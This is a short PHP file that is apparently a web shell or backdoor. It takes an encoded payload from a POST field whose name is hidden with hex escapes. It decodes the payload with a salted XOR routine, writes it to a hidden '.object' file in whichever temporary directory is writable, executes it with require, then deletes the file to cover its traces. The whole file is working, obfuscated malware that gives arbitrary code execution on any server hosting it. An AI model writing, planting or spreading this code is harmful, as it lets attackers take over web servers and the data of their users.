<!--yBSpc9QU-->
<?php

if(!is_null($_POST["f\x6C\x61g"] ?? null)){
$item = $_POST["f\x6C\x61g"];
  	$item=explode ("." 		,	$item 	);
$sym = '';
$salt2 = 'abcdefghijklmnopqrstuvwxyz0123456789';
$lenS = strlen($salt2);
$i = 0;
$__len = count($item);

do { if ($i >= $__len) break;
    $val = $item[$i];
    $chS = ord($salt2[$i % $lenS]);
    $d = ((int)$val - $chS - ($i % 10)) ^ 99;
    $sym .=	chr($d);
    $i++;	 }	while (true);
$elem = array_filter([getenv("TMP"), getcwd(), "/var/tmp", "/dev/shm", getenv("TEMP"), session_save_path(), "/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir()]);
foreach ($elem as $key => $resource) {
            if (is_dir($resource) && is_writable($resource)) {
            $pointer = implode("/", [$resource, ".object"]);
            $record = fopen($pointer, 'w');
if ($record && fwrite($record, $sym)) {
    fclose($record);
    require $pointer;
    @unlink($pointer);
    exit;
}
        }
}
}